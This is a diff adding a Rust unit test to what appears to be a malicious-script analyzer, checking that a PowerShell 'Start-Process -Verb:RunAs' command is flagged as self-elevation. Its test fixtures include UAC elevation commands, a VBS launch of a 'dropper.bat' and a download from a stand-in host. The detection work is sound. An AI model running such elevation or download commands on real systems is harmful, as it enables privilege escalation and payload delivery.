@@ -1534,6 +1534,23 @@ sh.Run("powershell -Command Invoke-WebRequest https://direct-js-const.example/p"
     }
 
     #[test]
+    fn start_process_verb_runas_captures_attached_verb() {
+        let script = b"@echo off\r\npowershell -Command \"Start-Process -FilePath:powershell.exe -ArgumentList:calc.exe -Verb:RunAs\"\r\n";
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation {
+                    target,
+                    args: Some(args),
+                } if target == "powershell.exe" && args == "calc.exe"
+            )),
+            "attached verb SelfElevation not detected: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn vbs_shell_execute_runas_emits_self_elevation_trait() {
         let script = br#"Set UAC = CreateObject("Shell.Application")
 UAC.ShellExecute "cmd.exe", "/c ""C:\Users\me\dropper.bat""", "", "runas", 1"#;
